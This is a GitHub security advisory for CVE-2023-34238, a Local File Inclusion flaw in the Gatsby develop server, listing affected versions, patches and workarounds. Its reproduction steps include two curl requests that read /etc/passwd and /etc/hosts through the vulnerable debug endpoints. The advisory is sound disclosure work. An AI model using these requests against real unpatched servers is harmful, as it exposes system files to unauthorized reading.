# [M] Gatsby develop server has Local File Inclusion vulnerability

## Summary
Severity: Medium
Advisory: GHSA-c6f8-8r25-c4gc
CVE: CVE-2023-34238
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2023-06-09
Source: https://github.com/advisories/GHSA-c6f8-8r25-c4gc
Type: github-advisory

## Affected
- npm: `gatsby` — affected >=0 <4.25.7
- npm: `gatsby` — affected >=5.0.0 <5.9.1

## Details
### Impact

The Gatsby framework prior to versions 4.25.7 and 5.9.1 contain a Local File Inclusion vulnerability in the `__file-code-frame` and `__original-stack-frame` paths, exposed when running the Gatsby develop server (`gatsby develop`).

The following steps can be used to reproduce the vulnerability:

```
# Create a new Gatsby project
$ npm init gatsby
$ cd my-gatsby-site

# Start the Gatsby develop server
$ gatsby develop

# Execute the Local File Inclusion vulnerability in __file-code-frame
$ curl "http://127.0.0.1:8000/__file-code-frame?filePath=/etc/passwd&lineNumber=1"

# Execute the Local File Inclusion vulnerability in __original-stack-frame
$ curl "http://127.0.0.1:8000/__original-stack-frame?moduleId=/etc/hosts&lineNumber=1&skipSourceMap=1"
```

It should be noted that by default `gatsby develop` is only accessible via the localhost `127.0.0.1`, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as `--host 0.0.0.0`, `-H 0.0.0.0`, or the `GATSBY_HOST=0.0.0.0` environment variable.


### Patches

A patch has been introduced in `gatsby@5.9.1` and `gatsby@4.25.7` which mitigates the issue.


### Workarounds

As stated above, by default `gatsby develop` is only exposed to the localhost `127.0.0.1`.  For those using the develop server in the default configuration no risk is posed.  If other ranges are required, preventing the develop server from being exposed to untrusted interfaces or IP address ranges would mitigate the risk from this vulnerability.

We encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.


### Credits

We would like to thank Maxwell Garrett of Assetnote for bringing the `__file-code-frame` issue to our attention.


### For more information

Email us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).

## References
- https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-c6f8-8r25-c4gc
- https://nvd.nist.gov/vuln/detail/CVE-2023-34238
- https://github.com/gatsbyjs/gatsby/commit/ae5a654eb346b2e7a9d341b809b2f82d34c0f17c
- https://github.com/gatsbyjs/gatsby/commit/fc22f4ba3ad7ca5fb3592f38f4f0ca8ae60b4bf7
- https://github.com/gatsbyjs/gatsby
